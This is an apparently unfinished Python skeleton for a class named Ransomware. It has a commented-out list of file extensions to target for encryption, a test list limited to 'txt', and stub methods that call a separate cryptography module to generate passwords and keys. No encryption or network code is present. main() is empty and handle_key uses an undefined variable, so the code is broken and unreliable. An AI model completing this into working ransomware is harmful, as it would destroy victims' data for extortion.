import platform
import sys
import os
import fnmatch
import time
from tkinter import *
from tkinter import messagebox
from functools import partial
from PIL import ImageTk, Image
from threading import Thread
import subprocess

import modules.cryptography


class Ransomware:
    def __init__(self, starting_dir_test):
        # self.interesting_extensions = [
        #     'dwg', 'dxf', 'rtd', 'rft', 'rte', 'rvg', 'ies', 'rfa', 'rds'
        #                                                             'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd',
        #     'raw',
        #     'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',
        #     'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',
        #     'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',
        #     'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', 'mobi',
        #     'yml', 'yaml', 'json', 'xml', 'csv',
        #     'db', 'sql', 'dbf', 'mdb', 'iso',
        #     'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',
        #     'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',
        #     'java', 'class', 'jar',
        #     'ps', 'bat', 'vb',
        #     'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',
        #     'go', 'py', 'pyc', 'bf', 'coffee',
        #     'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',
        # ]

        self.interesting_extensions_tests = ['txt']
        self.starting_dir_test = starting_dir_test

    def main(self):
        start = time.time()


        stop = time.time()
        print('Encryption made in {}'.format(round(stop - start, 3)))


    def gen_pass(self):
        new_password = modules.cryptography.generate_password()
        return new_password

    
    def handle_key(self):
        key = modules.cryptography.generate_key(passwd)
        bin_key = ''

        for c in key:
            bin_key += str(c) + '.'

        return {
                "key": key,
                "bin_key": bin_key[:-1]
                }

if __name__ == '__main__':
    pass


